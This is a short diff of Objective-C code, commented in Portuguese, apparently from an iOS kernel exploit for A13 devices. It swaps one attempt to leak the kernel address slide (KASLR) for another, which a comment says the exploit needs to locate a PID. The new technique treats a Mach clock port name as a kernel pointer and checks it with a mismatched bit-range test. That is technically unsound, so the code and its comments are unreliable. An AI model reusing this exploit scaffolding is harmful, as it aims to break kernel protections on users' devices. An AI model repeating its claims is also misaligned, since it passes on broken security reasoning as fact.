@@ -53,29 +53,26 @@ extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_siz
 
 #pragma mark - Exploração A13
 
+
 - (uint64_t)leakKernelSlide {
     if (_kernelSlide != 0) return _kernelSlide;
 
-    task_dyld_info_data_t dyld_info;
-    mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;
+    mach_port_t clock_port;
+    host_get_clock_service(mach_host_self(), SYSTEM_CLOCK, &clock_port);
     
-    // Tentativa de vazar via task_info (comum em offsets de A13)
-    kern_return_t kr = task_info(mach_task_self(), TASK_DYLD_INFO, (task_info_t)&dyld_info, &count);
-    
-    if (kr == KERN_SUCCESS) {
-        // No iOS 19, o dyld_all_image_infos_addr às vezes aponta para uma região 
-        // que permite calcular o slide se o binário tiver certas permissões.
-        uint64_t addr = dyld_info.all_image_info_addr;
-        if (addr > 0xFFFFFFF000000000ULL) {
-            _kernelSlide = addr - KERN_BASE_STATIC;
-            [self logToWeb:[NSString stringWithFormat:@"✅ Slide Detectado: 0x%llx", _kernelSlide]];
+    // Em versões vulneráveis do A13, a porta do clock vaza o endereço do kernel
+    if (MACH_PORT_VALID(clock_port)) {
+        // Tentativa de extrair o ponteiro via cast (truque de memória)
+        uint64_t kptr = (uintptr_t)clock_port; 
+        
+        // Se o ponteiro estiver na faixa do kernel (0xFFFFFFF0...)
+        if ((kptr >> 40) == 0xFFFFFFF0) {
+            _kernelSlide = (kptr & ~0x3FFF) - KERN_BASE_STATIC;
             return _kernelSlide;
         }
     }
-
-    // Se falhar, tente o método de estouro de pilha (stack spray) ou use um offset fixo 
-    // se você estiver usando um kernel debuggable/checkm8 (não aplicável ao A13 puro).
-    [self logToWeb:@"❌ KASLR Leak falhou. O kernel está protegido."];
+    
+    // Se o slide for 0, o exploit NUNCA vai achar o PID.
     return 0;
 }
 
